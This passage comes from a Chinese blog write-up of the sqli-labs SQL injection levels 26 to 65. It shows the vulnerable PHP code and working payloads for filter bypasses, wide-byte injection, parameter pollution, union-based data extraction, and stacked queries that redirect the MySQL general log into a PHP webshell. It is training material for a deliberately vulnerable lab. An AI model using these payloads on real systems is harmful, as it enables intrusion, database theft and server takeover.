 </span><br></pre></td></tr></tbody></table></figure>

<p><code>or</code>和<code>and</code>使用双写或者<code>||``&amp;&amp;</code>替换。</p>
<p>过滤注释使用闭合绕过。</p>
<p>空格字符绕过</p>
<p><code>%a0</code>：空格</p>
<p><code>%09</code>：TAB键（水平）</p>
<p><code>%0a</code>：新建一行</p>
<p><code>%0c</code>：新的一页</p>
<p><code>%0d</code>：return功能</p>
<p><code>%0b</code>：TAB键（垂直）</p>
<p><code>%00</code>：空字符</p>
<h4 id="3-3-8-Less-26a"><a href="#3-3-8-Less-26a" class="headerlink" title="3.3.8 Less-26a"></a>3.3.8 Less-26a</h4><p>无区别。</p>
<h4 id="3-3-9-Less-27"><a href="#3-3-9-Less-27" class="headerlink" title="3.3.9 Less-27"></a>3.3.9 Less-27</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/select/m'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/select/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/Select/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/union/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/Union/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></tbody></table></figure>

<p><code>select</code>和<code>union</code>使用大小写绕过和嵌套绕过即可。</p>
<h4 id="3-3-10-Less-27a"><a href="#3-3-10-Less-27a" class="headerlink" title="3.3.10 Less-27a"></a>3.3.10 Less-27a</h4><p>无区别。</p>
<h4 id="3-3-11-Less-28"><a href="#3-3-11-Less-28" class="headerlink" title="3.3.11 Less-28"></a>3.3.11 Less-28</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);.</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>不能大小写绕过，嵌套绕过即可。</p>
<h4 id="3-3-12-Less-28a"><a href="#3-3-12-Less-28a" class="headerlink" title="3.3.12 Less-28a"></a>3.3.12 Less-28a</h4><p>无区别。</p>
<h4 id="3-3-13-Less-29"><a href="#3-3-13-Less-29" class="headerlink" title="3.3.13 Less-29"></a>3.3.13 Less-29</h4><p>这里主要难点在<code>login.php</code>而不是<code>index.php</code>中。</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//提取id</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= <span class="title function_ invoke__">explode</span>(<span class="string">"&amp;"</span>,<span class="variable">$q_s</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="variable">$val</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">"id"</span>)</span><br><span class="line">		{</span><br><span class="line">			<span class="variable">$id_value</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line"><span class="variable">$id1</span>=<span class="title function_ invoke__">java_implimentation</span>(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//id只能为数字</span></span><br><span class="line"><span class="title function_ invoke__">whitelist</span>(<span class="variable">$id1</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>这里可以构造两个<code>id</code>，因为<code>java_implimentation()</code>函数只会拿到第一个<code>id</code>去检测，从而使得后面<code>id</code>绕过检测。</p>
<p>这里根据语言特性绕过可以看本文前面部分。</p>
<h4 id="3-3-14-Less-30"><a href="#3-3-14-Less-30" class="headerlink" title="3.3.14 Less-30"></a>3.3.14 Less-30</h4><p>没区别。</p>
<h4 id="3-3-15-Less-31"><a href="#3-3-15-Less-31" class="headerlink" title="3.3.15 Less-31"></a>3.3.15 Less-31</h4><p>没区别。</p>
<h4 id="3-3-16-Less-32"><a href="#3-3-16-Less-32" class="headerlink" title="3.3.16 Less-32"></a>3.3.16 Less-32</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/'</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, <span class="variable">$string</span>);  </span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, <span class="variable">$string</span>);      </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$_GET</span>[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>宽字节注入，<code>%df%5c</code>被当做一个汉字，使得<code>'</code>逃逸。</p>
<p>使用<code>\</code>转义<code>\</code>，如<code>\\'</code>，第二个<code>\</code>被转义，使<code>'</code>出来。</p>
<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>'</code> 转为 utf-16 为<code>�</code></p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> \'|iconv -f utf-8 -t utf-16</span><br><span class="line">��<span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>这里我的理解是，�在URL编码后为<code>%EF%BF%BD</code>，MySQL 在使用 GBK 编码的时候，<code>%EF%BF</code>被当做一个汉字，<code>%BD</code>与<code>%5c</code>也就是<code>\</code>被当做一个汉字，因此单引号逃逸出来。</p>
</blockquote>
<p>可以让<code>'</code>逃逸出来</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>�<span class="string">'or 1%23</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250311002549978.png" class="" title="image-20250311002549978">

<h4 id="3-3-17-Less-33"><a href="#3-3-17-Less-33" class="headerlink" title="3.3.17 Less-33"></a>3.3.17 Less-33</h4><p>没区别。</p>
<h4 id="3-3-18-Less-34"><a href="#3-3-18-Less-34" class="headerlink" title="3.3.18 Less-34"></a>3.3.18 Less-34</h4><p>没区别。</p>
<h4 id="3-3-19-Less-35"><a href="#3-3-19-Less-35" class="headerlink" title="3.3.19 Less-35"></a>3.3.19 Less-35</h4><p>没区别。</p>
<h4 id="3-3-20-Less-36"><a href="#3-3-20-Less-36" class="headerlink" title="3.3.20 Less-36"></a>3.3.20 Less-36</h4><p>没区别</p>
<h4 id="3-3-21-Less-37"><a href="#3-3-21-Less-37" class="headerlink" title="3.3.21 Less-37"></a>3.3.21 Less-37</h4><p>没区别。</p>
<h3 id="3-4-Less-38-53"><a href="#3-4-Less-38-53" class="headerlink" title="3.4 Less-38-53"></a>3.4 Less-38-53</h3><blockquote>
<p>下面无特殊利用的就当做无区别了。</p>
</blockquote>
<h4 id="3-4-1-Less-38"><a href="#3-4-1-Less-38" class="headerlink" title="3.4.1 Less-38"></a>3.4.1 Less-38</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)):</span><br><span class="line">    <span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br></pre></td></tr></tbody></table></figure>

<p>产生堆叠的原因在于<code>mysqli_multi_query()</code>函数，它会执行一个或用分号隔开的多个SQL语句。</p>
<p>堆叠注入可以直接写马GetShell。</p>
<p>这里先查看mysql配置</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'general%'</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/e783195a8830.<span class="built_in">log</span> |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></tbody></table></figure>

<p>可以看见默认没有开启，首先手动开启。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">';set global general_log="ON";set global general_log_file='</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>Less<span class="number">-38</span><span class="operator">/</span>shell.php<span class="string">'%23</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'general%'</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | ON                              |</span><br><span class="line">| general_log_file | /var/www/html/Less-38/shell.php |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></tbody></table></figure>

<p>然后就可以写入php代码了</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">';select '</span><span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span><span class="string">'%23</span></span><br></pre></td></tr></tbody></table></figure>

<p>查看文件</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /var/www/html/Less-38/shell.php</span><br><span class="line">250311 14:32:51    10 Connect   root@localhost on security</span><br><span class="line">                   10 Init DB   security</span><br><span class="line">                   10 Query     SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">'1'</span>;<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>#<span class="string">' LIMIT 0,1</span></span><br></pre></td></tr></tbody></table></figure>

<p>成功写入，但是可能是权限的问题，没有成功执行。</p>
<h4 id="3-4-2-Less-39"><a href="#3-4-2-Less-39" class="headerlink" title="3.4.2 Less-39"></a>3.4.2 Less-39</h4><p>无区别</p>
<h4 id="3-4-3-Less-40"><a href="#3-4-3-Less-40" class="headerlink" title="3.4.3 Less-40"></a>3.4.3 Less-40</h4><p>无区别</p>
<h4 id="3-4-4-Less-41"><a href="#3-4-4-Less-41" class="headerlink" title="3.4.4 Less-41"></a>3.4.4 Less-41</h4><p>无区别</p>
<h4 id="3-4-5-Less-42"><a href="#3-4-5-Less-42" class="headerlink" title="3.4.5 Less-42"></a>3.4.5 Less-42</h4><p>类似于<code>Less-24</code>，少了一些过滤。</p>
<h4 id="3-4-6-Less-43"><a href="#3-4-6-Less-43" class="headerlink" title="3.4.6 Less-43"></a>3.4.6 Less-43</h4><p>无区别。</p>
<h4 id="3-4-7-Less-44"><a href="#3-4-7-Less-44" class="headerlink" title="3.4.7 Less-44"></a>3.4.7 Less-44</h4><p>无区别。</p>
<h4 id="3-4-8-Less-45"><a href="#3-4-8-Less-45" class="headerlink" title="3.4.8 Less-45"></a>3.4.8 Less-45</h4><p>无区别。</p>
<h4 id="3-4-9-Less-46"><a href="#3-4-9-Less-46" class="headerlink" title="3.4.9 Less-46"></a>3.4.9 Less-46</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'sort'</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM users ORDER BY <span class="subst">$id</span>"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p><code>order by</code>注入，具体看本文order by注入部分。</p>
<h4 id="3-4-10-Less-47"><a href="#3-4-10-Less-47" class="headerlink" title="3.4.10 Less-47"></a>3.4.10 Less-47</h4><p>无区别。</p>
<h4 id="3-4-11-Less-48"><a href="#3-4-11-Less-48" class="headerlink" title="3.4.11 Less-48"></a>3.4.11 Less-48</h4><p>无区别。</p>
<h4 id="3-4-12-Less-49"><a href="#3-4-12-Less-49" class="headerlink" title="3.4.12 Less-49"></a>3.4.12 Less-49</h4><p>无区别。</p>
<h4 id="3-4-13-Less-50"><a href="#3-4-13-Less-50" class="headerlink" title="3.4.13 Less-50"></a>3.4.13 Less-50</h4><p>无区别。</p>
<h4 id="3-4-14-Less-51"><a href="#3-4-14-Less-51" class="headerlink" title="3.4.14 Less-51"></a>3.4.14 Less-51</h4><p>无区别。</p>
<h4 id="3-4-15-Less-52"><a href="#3-4-15-Less-52" class="headerlink" title="3.4.15 Less-52"></a>3.4.15 Less-52</h4><p>无区别。</p>
<h4 id="3-4-16-Less-53"><a href="#3-4-16-Less-53" class="headerlink" title="3.4.16 Less-53"></a>3.4.16 Less-53</h4><p>无区别。</p>
<h3 id="3-5-Less54-65"><a href="#3-5-Less54-65" class="headerlink" title="3.5 Less54-65"></a>3.5 Less54-65</h3><h4 id="3-5-1-Less-54"><a href="#3-5-1-Less-54" class="headerlink" title="3.5.1 Less-54"></a>3.5.1 Less-54</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$times</span>= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'reset'</span>]))</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">'challenge'</span>, <span class="string">' '</span>, <span class="title function_ invoke__">time</span>() - <span class="number">3600000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">'challenge'</span>]))</span><br><span class="line">        <span class="variable">$sessid</span>=<span class="variable">$_COOKIE</span>[<span class="string">'challenge'</span>];</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="variable">$expire</span> = <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">data</span>(<span class="variable">$table</span>,<span class="variable">$col</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">"challenge"</span>, <span class="variable">$hash</span>, <span class="variable">$expire</span>);</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$_GET</span>[<span class="string">'id'</span>]:</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">"SELECT * FROM security.users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">        <span class="string">"查询结果"</span></span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">       </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">'key'</span>]);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT 1 FROM <span class="subst">$table</span> WHERE <span class="subst">$col1</span>= '<span class="subst">$key</span>'"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>十次以内查出结果</p>
<p>判断闭合</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">?id=1'</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></tbody></table></figure>

<p>判断字段数</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'order by 3%23</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></tbody></table></figure>

<p>查数据库名</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">'union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23</span></span><br><span class="line"><span class="string">information_schema,challenges,mysql,performance_schema,security</span></span><br></pre></td></tr></tbody></table></figure>

<p>查表名</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">'union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">')%23</span></span><br><span class="line"><span class="string">1KBD9AIPC9</span></span><br></pre></td></tr></tbody></table></figure>

<p>查字段名</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">'union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="number">1</span>KBD9AIPC9<span class="string">')%23</span></span><br><span class="line"><span class="string">id,sessid,secret_2TF1,tryy</span></span><br></pre></td></tr></tbody></table></figure>

<p>查key值</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">'union select 1,2,(select concat(secret_2TF1) from challenges.1KBD9AIPC9)%23</span></span><br><span class="line"><span class="string">vJWlm4ld9mZEZN2o7n59t4A8</span></span><br></pre></td></tr></tbody></table></figure>

<p>总共八次。</p>
<h4 id="3-5-2-Less-55"><a href="#3-5-2-Less-55" class="headerlink" title="3.5.2 Less-55"></a>3.5.2 Less-55</h4><p>无区别。</p>
<h4 id="3-5-3-Less-56"><a href="#3-5-3-Less-56" class="headerlink" title="3.5.3 Less-56"></a>3.5.3 Less-56</h4><p>无区别。</p>
<h4 id="3-5-4-Less-57"><a href="#3-5-4-Less-57" class="headerlink" title="3.5.4 Less-57"></a>3.5.4 Less-57</h4><p>无区别。</p>
<h4 id="3-5-5-Less-58"><a href="#3-5-5-Less-58" class="headerlink" title="3.5.5 Less-58"></a>3.5.5 Less-58</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM security.users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">'id'</span>]];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Password : '</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>联合查询没结果输出，改为报错注入。</p>
<h4 id="3-5-6-Less-59"><a href="#3-5-6-Less-59" class="headerlink" title="3.5.6 Less-59"></a>3.5.6 Less-59</h4><p>无区别。</p>
<h4 id="3-5-7-Less-60"><a href="#3-5-7-Less-60" class="headerlink" title="3.5.7 Less-60"></a>3.5.7 Less-60</h4><p>无区别。</p>
<h4 id="3-5-8-Less-61"><a href="#3-5-8-Less-61" class="headerlink" title="3.5.8 Less-61"></a>3.5.8 Less-61</h4><p>无区别。</p>
<h4 id="3-5-9-Less-62"><a href="#3-5-9-Less-62" class="headerlink" title="3.5.9 Less-62"></a>3.5.9 Less-62</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM security.users WHERE id=('<span class="subst">$id</span>') LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">'id'</span>]];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Password : '</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>

<p>不能报错注入了，改为布尔盲注或者时间盲注即可</p>
<h4 id="3-5-9-Less-63"><a href="#3-5-9-Less-63" class="headerlink" title="3.5.9 Less-63"></a>3.5.9 Less-63</h4><p>无区别。</p>
<h4 id="3-5-10-Less-64"><a href="#3-5-10-Less-64" class="headerlink" title="3.5.10 Less-64"></a>3.5.10 Less-64</h4><p>无区别。</p>
<h4 id="3-5-1-Less-65"><a href="#3-5-1-Less-65" class="headerlink" title="3.5.1 Less-65"></a>3.5.1 Less-65</h4><p>无区别。</p>
<h3 id="3-6-总结"><a href="#3-6-总结" class="headerlink" title="3.6 总结"></a>3.6 总结</h3><p>终于是刷完了，总体来说把每种注入方式都练习了个遍，并学习了一些绕过手法，整个过程除了<code>Less-1</code>跟着大佬把<code>sqlmap</code>使用熟悉了一下，其余均为手注，加强自己的能力，尽量不变成离了脚本就活不了的脚本小子（）。但是其实还有许多利用手法没有学到，以后遇到就在本文填补，避免做完就忘了。</p>
